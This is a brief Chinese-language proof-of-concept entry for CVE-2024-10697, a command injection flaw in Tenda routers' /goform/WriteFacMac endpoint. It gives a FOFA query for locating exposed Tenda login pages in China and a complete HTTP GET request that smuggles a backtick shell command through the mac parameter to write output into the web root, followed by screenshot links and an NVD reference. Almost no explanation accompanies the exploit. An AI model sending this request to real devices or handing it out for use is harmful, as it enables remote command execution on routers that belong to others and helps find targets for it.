# tenda路由器WriteFacMac存在远程命令执行漏洞(CVE-2024-10697)

## fofa

```javascript
title="Tenda | LOGIN" && country="CN"
```

## poc

```javascript
GET /goform/WriteFacMac?mac=`ls%20%3E/webroot/1.txt` HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Cache-Control: max-age=0
Connection: keep-alive
Host: 
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36 Edg/132.0.0.0
```

![image.png](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202501061038061.png)


![image.png](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202501061038043.png)

## 漏洞来源

- https://nvd.nist.gov/vuln/detail/CVE-2024-10697